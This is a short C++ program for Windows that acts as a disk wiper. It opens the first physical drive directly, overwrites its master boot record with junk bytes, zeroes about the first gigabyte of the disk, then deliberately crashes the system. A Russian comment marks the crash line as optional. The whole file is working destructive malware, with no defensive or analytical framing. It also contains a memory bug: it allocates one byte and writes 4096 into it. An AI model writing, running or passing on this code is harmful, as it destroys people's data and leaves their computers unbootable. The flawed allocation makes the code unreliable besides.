// Code by HappyWinWhistler
// 2022-2025

#include <windows.h>
#include <iostream>
#include <cstdlib>

void mbrwrite() {
	std::string drivePath = "\\\\.\\PhysicalDrive0";
	HANDLE hdrive = CreateFileA(
		drivePath.c_str(),
		GENERIC_WRITE,
		FILE_SHARE_WRITE | FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	BYTE buffer[512] = { 0 };
	buffer[1] = 0x5F;
	buffer[2] = 0xAA;
	buffer[3] = 0xCA;
	buffer[4] = 0x33;
	buffer[5] = 0xAC;
	buffer[6] = 0x1C;
	buffer[7] = 0xAF;
	buffer[8] = 0x22;
	buffer[9] = 0xFC;
	buffer[10] = 0xF2;
	buffer[11] = 0xCF;
	buffer[12] = 0xFA;
	buffer[13] = 0xAC;
	buffer[510] = 0x5F;
	buffer[511] = 0xAA;

	DWORD bytesWritten;
	BOOL result = WriteFile(hdrive, buffer, sizeof(buffer), &bytesWritten, NULL);

	LARGE_INTEGER li;
	li.QuadPart = sizeof(buffer);
	DWORD bytesToWrite = 4096;
	BYTE* zeroBuffer = new BYTE(bytesToWrite);
	memset(zeroBuffer, 0, bytesToWrite);

	for (LARGE_INTEGER i = li; i.QuadPart < 1024 * 1024 * 1024; i.QuadPart += bytesToWrite) {
		DWORD bytesWrittenZero;
		SetFilePointer(hdrive, i.QuadPart, NULL, FILE_BEGIN);
		WriteFile(hdrive, zeroBuffer, bytesToWrite, &bytesWrittenZero, NULL);
	}

	delete[] zeroBuffer;
	CloseHandle(hdrive);
}

int main() {
	mbrwrite();
	system("powershell wininit"); // Краш системы, можно удалить эту строку если не требуется
}